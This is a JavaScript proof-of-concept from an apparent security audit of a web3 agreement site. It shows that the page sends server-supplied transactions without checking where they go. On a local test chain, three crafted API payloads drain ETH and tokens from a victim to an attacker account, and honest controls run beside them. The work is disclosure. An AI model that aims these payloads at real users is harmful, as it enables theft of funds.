// ROUND 16 — Team B2, K-1011: website /agreement/:id page (chunk
// page-c2f2b455b7bc6e38.js) sends the server's action/release/refund
// transaction VERBATIM via sendTransaction — no pin, no check.
// Verbatim page code (chunk, function x):
//   async function x(e,t){ ... let e=await m({to:t.to,data:t.data,
//   value:BigInt(t.value||"0"),chainId:l.ob.id}); ... }
// The chunk contains 0x "0x84C6" (the Agreement contract), 0x HI, and never
// reads f.contract / f.agreement. Contrast: the SDK's #guard pins `to` to
// AGREEMENT/ESCROWS and fn-allowlist ["release"]/["refund"] (sdk-live.mjs
// #guard); the website has no equivalent guard at all.
// Fresh Anvil 4663 (port 8549) + StubAgreement + MockERC20. Throwaway
// Anvil default keys only. No live POSTs, no real funds.
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  createPublicClient, createWalletClient, http as vhttp, defineChain,
  parseAbi, parseEther, parseUnits, encodeFunctionData, erc20Abi,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";

const ROOT = path.dirname(fileURLToPath(import.meta.url)); // staging repo root (patched from round PoC)
const RPC = "http://127.0.0.1:8549";
const API_PORT = 3017;
const chain = defineChain({ id: 4663, name: "Robinhood Chain",
  nativeCurrency: { decimals: 18, name: "ETH", symbol: "ETH" },
  rpcUrls: { default: { http: [RPC] } } });

// Anvil default accounts: 0=victim, 1=attacker, 2=payee
const victim = privateKeyToAccount("0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80");
const attacker = privateKeyToAccount("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d");
const payee = privateKeyToAccount("0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a");
const V = victim.address, A = attacker.address, P = payee.address;

const pc = createPublicClient({ chain, transport: vhttp(RPC) });
const wv = createWalletClient({ chain, transport: vhttp(RPC), account: victim });

const STUB_ABI = parseAbi([
  "function vote(uint256 id,uint256 index) returns (bool)",
  "function release(uint256 id) returns (bool)",
  "function voted(uint256 id) view returns (bool)",
  "function released(uint256 id) view returns (bool)",
]);
const loadArtifact = (name) => JSON.parse(fs.readFileSync(
  path.join(ROOT, `chain/out/${name}.sol/${name.split("/").pop()}.json`), "utf8"));
const stubArt = loadArtifact("StubAgreement");
const tokArt = loadArtifact("MockERC20");

const eth = async (who) => pc.getBalance({ address: who });
const tok = async (who, t) => pc.readContract({ address: t, abi: erc20Abi, functionName: "balanceOf", args: [who] });

// --- mock Bull API: GET /api/v1/agreements/13 returns the case payload ---
let apiPayload = null;
const api = http.createServer((req, res) => {
  res.writeHead(200, { "content-type": "application/json" });
  res.end(JSON.stringify(apiPayload));
});
await new Promise((r) => api.listen(API_PORT, r));

// --- VERBATIM page logic: fetch agreement, click button -> x(name, tx) ---
async function pageClick(tx) {
  const f = await (await fetch(`http://127.0.0.1:${API_PORT}/api/v1/agreements/13`)).json();
  const t = tx(f); // the button hands the server's tx object straight to x()
  const hash = await wv.sendTransaction({ to: t.to, data: t.data, value: BigInt(t.value || "0"), chain });
  const rc = await pc.waitForTransactionReceipt({ hash });
  if (rc.status !== "success") throw new Error("tx failed " + hash);
  return hash;
}

const results = [];
const fmtEth = (b) => (Number(b) / 1e18).toFixed(4);

// deploy
const stubHash = await wv.deployContract({ abi: stubArt.abi, bytecode: stubArt.bytecode.object, args: [P] });
const stubRc = await pc.waitForTransactionReceipt({ hash: stubHash });
const STUB = stubRc.contractAddress;
const tokHash = await wv.deployContract({ abi: tokArt.abi, bytecode: tokArt.bytecode.object, args: [] });
const tokRc = await pc.waitForTransactionReceipt({ hash: tokHash });
const TOK = tokRc.contractAddress;
await wv.writeContract({ address: TOK, abi: tokArt.abi, functionName: "mint", args: [V, parseUnits("1000", 18)] });
// fund the stub agreement with 0.5 ETH (the honest release pot) — wait for
// the receipt: sendTransaction returns on broadcast, and the P1 baseline
// balance read below must see the funding already mined, or P1's victim
// loss reads 1.5001 instead of 1.0000 (race seen once in coordinator re-run).
const fundHash = await wv.sendTransaction({ to: STUB, value: parseEther("0.5") });
await pc.waitForTransactionReceipt({ hash: fundHash });

// chunk evidence: the page never pins the destination
const chunk = fs.readFileSync(path.join(ROOT, "agreement-chunk.js"), "utf8");
results.push({ check: "chunk has 0x Agreement addr", count84C6: (chunk.match(/0x84C6/g) || []).length,
  countHI: (chunk.match(/0xd961/g) || []).length, readsContract: chunk.includes("f.contract"), readsAgreement: chunk.includes("f.agreement") });

// P1 — malicious "Vote yes" action: to=attacker EOA, value=1 ETH, data empty
{
  const v0 = await eth(V), a0 = await eth(A);
  apiPayload = { id: "13", agreement: STUB, contract: STUB, status: "open",
    conditions: [{ index: 0, type: "quorum", met: false,
      actions: [{ name: "vote", from: V, to: A, data: "0x", value: "1000000000000000000" }] }] };
  await pageClick((f) => f.conditions[0].actions[0]);
  const dv = fmtEth(v0 - await eth(V)), da = fmtEth(await eth(A) - a0);
  results.push({ case: "P1 vote-action -> attacker EOA 1 ETH", exploited: da === "1.0000", victimEthLost: dv, attackerEthGained: da });
}
// P2 — malicious releaseTransaction: to=attacker EOA, value=0.5 ETH
{
  const a0 = await eth(A);
  apiPayload = { id: "13", agreement: STUB, contract: STUB, status: "open", conditions: [],
    releaseTransaction: { to: A, data: "0x", value: "500000000000000000" } };
  await pageClick((f) => f.releaseTransaction);
  results.push({ case: "P2 releaseTransaction -> attacker EOA 0.5 ETH", exploited: fmtEth(await eth(A) - a0) === "0.5000",
    attackerEthGained: fmtEth(await eth(A) - a0) });
}
// P3 — malicious action draining tokens via the (legit-looking) token contract
{
  const v0 = await tok(V, TOK), a0 = await tok(A, TOK);
  const data = encodeFunctionData({ abi: erc20Abi, functionName: "transfer", args: [A, parseUnits("1000", 18)] });
  apiPayload = { id: "13", agreement: STUB, contract: STUB, status: "open",
    conditions: [{ index: 0, type: "attest", met: false,
      actions: [{ name: "vote", from: V, to: TOK, data, value: "0" }] }] };
  await pageClick((f) => f.conditions[0].actions[0]);
  results.push({ case: "P3 vote-action -> token transfer 1000 to attacker", exploited: (await tok(A, TOK)) - a0 === parseUnits("1000", 18),
    victimTokLost: ((v0 - await tok(V, TOK)) / 10n ** 18n).toString(), attackerTokGained: ((await tok(A, TOK) - a0) / 10n ** 18n).toString() });
}
// C0 — honest vote: to=StubAgreement, vote(1,0), value 0 — vote lands, no funds move
{
  const v0 = await eth(V);
  const data = encodeFunctionData({ abi: STUB_ABI, functionName: "vote", args: [1n, 0n] });
  apiPayload = { id: "13", agreement: STUB, contract: STUB, status: "open",
    conditions: [{ index: 0, type: "quorum", met: false,
      actions: [{ name: "vote", from: V, to: STUB, data, value: "0" }] }] };
  await pageClick((f) => f.conditions[0].actions[0]);
  const voted = await pc.readContract({ address: STUB, abi: STUB_ABI, functionName: "voted", args: [1n] });
  const lost = v0 - await eth(V); // gas only (~wei)
  results.push({ case: "C0 honest vote", ok: voted === true && lost < parseEther("0.01"), voteRecorded: voted, victimEthLost: fmtEth(lost) });
}
// C1 — honest release: to=StubAgreement, release(1), value 0 — payee gets the 0.5 ETH pot
{
  const p0 = await eth(P);
  const data = encodeFunctionData({ abi: STUB_ABI, functionName: "release", args: [1n] });
  apiPayload = { id: "13", agreement: STUB, contract: STUB, status: "open", conditions: [],
    releaseTransaction: { to: STUB, data, value: "0" } };
  await pageClick((f) => f.releaseTransaction);
  const rel = await pc.readContract({ address: STUB, abi: STUB_ABI, functionName: "released", args: [1n] });
  results.push({ case: "C1 honest release", ok: rel === true && fmtEth(await eth(P) - p0) === "0.5000",
    released: rel, payeeEthGained: fmtEth(await eth(P) - p0) });
}

const exploited = results.filter((r) => r.exploited === true).length;
const controlsOk = results.filter((r) => r.ok === true).length;
const out = { results, summary: { exploited, controlsOk, chunkPin: "none" } };
fs.writeFileSync(path.join(ROOT, "poc-result-k1011.json"), JSON.stringify(out, null, 2));
console.log(JSON.stringify(out.summary), JSON.stringify(results.map((r) => r.case || r.check)));
api.close();
process.exit(0);
